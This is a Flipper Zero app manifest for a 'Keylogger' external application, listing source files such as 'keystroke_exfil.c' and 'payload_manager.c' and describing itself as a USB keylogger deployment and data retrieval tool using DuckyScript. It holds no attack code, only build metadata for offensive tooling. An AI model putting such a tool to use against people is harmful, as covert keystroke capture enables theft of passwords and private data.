App(
    appid="keylogger",
    name="Keylogger",
    apptype=FlipperAppType.EXTERNAL,
    entry_point="keylogger_app",
    cdefines=["APP_KEYLOGGER"],
    stack_size=8 * 1024,
    fap_icon="icon.png",
    sources=[
        "keylogger_app.c",
        "keystroke_exfil.c",
        "progress_view.c",
        "success_failure_view.c",
        "help_view.c",
        "file_viewer_view.c",
        "keylog_browser_view.c",
        "payload_manager.c",
    ],
    fap_category="USB",
    fap_author="dag nazty",
    fap_weburl="https://github.com/dagnazty/Flipper_Keylogger",
    fap_version=(1, 0),
    fap_description="USB keylogger deployment and data retrieval tool with DuckyScript support.",
)
